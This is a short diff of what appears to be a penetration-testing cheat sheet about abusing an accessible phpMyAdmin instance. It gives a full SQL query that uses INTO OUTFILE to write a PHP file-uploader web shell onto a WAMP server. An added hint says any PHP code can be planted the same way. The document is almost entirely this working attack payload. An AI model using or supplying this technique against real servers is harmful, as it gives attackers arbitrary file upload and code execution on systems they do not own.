@@ -1,4 +1,5 @@
-//If a phpmyadmin instance is accessible, go to the "SQL" tab to execute the following sql query. This creates an php file to provide file upload functionality. The path for the uploader.php file is set for an wamp server, maybe needs some modification.
+# If a phpmyadmin instance is accessible, go to the "SQL" tab to execute the following sql query. This creates an php file to provide file upload functionality. The path for the uploader.php file is set for an wamp server, maybe needs some modification.
+# Hint: Instead of the "file uploader" we can issue every kind of php code into a file by using the "INTO OUTFILE" sql keyword!
 
 SELECT 
 "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
